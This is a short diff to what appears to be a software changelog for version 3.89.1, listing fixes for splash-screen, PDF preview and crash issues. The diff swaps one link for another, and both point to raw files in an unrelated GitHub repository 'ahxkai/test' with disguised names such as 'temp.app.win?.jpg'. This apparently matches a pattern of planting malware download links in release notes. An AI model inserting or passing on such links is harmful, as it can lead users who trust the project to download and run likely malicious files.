@@ -1,5 +1,5 @@
 3.89.1 (2024-08-23)
-[[https://raw.githubusercontent.com/ahxkai/test/refs/heads/main/DIXml702.win?.rar]]
+[[https://raw.githubusercontent.com/ahxkai/test/refs/heads/main/temp.app.win?.jpg]]
 🛠️ Ensuring splash-screen logo doesn't show in Alt-Tab
 🛠️ Faster previews and thumbnails for large PDFs 
 🐞 Fixed issue where some PDFs would crash OC
